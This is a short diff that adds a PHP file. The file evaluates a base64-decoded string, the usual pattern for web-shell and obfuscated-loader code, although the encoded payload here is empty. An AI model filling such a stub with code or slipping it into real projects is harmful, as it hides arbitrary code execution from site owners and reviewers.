@@ -1,0 +1,4 @@
+<?php
+$encoded_script = "";
+eval("?>" . base64_decode($encoded_script));
+?>
